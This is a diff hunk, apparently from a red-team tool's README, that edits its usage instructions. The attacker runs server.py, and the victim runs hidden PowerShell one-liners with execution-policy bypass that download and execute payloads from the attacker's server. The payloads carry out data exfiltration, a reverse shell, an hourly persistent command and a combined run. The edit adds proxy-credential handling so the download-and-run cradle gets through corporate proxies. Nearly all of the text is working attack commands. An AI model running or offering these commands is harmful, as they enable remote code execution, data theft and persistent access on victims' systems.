@@ -9,14 +9,14 @@ Useful for redteam.
 ATTACKER> python3 server.py
 
 #For data exfiltration
-VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://<SERVER-IP>:<SERVER-PORT>/client_exf');"
+VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/client_exf");"
 
 #For reverse-shell
-VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://<SERVER-IP>:<SERVER-PORT>/client_rvs');"
+VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/client_rvs");"
 
 #For running a persistent command (by default runs every hour for 6 days, but can be changed in `client_pers.ps1`)
-VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://<SERVER-IP>:<SERVER-PORT>/client_pers');"
+VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/client_pers");"
 
 #For running data exfiltration + reverse-shell
-VICTIM> powershell -ep bypass -windowstyle hidden -c "IEX (New-Object Net.WebClient).DownloadString('https://<SERVER-IP>:<SERVER-PORT>/run_all');"
+VICTIM> powershell -ep bypass -windowstyle hidden -c "$w=(New-Object Net.WebClient);$w.Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;IEX $w.DownloadString("http://<SERVER-IP>:<SERVER-PORT>/run_all");"
 ```
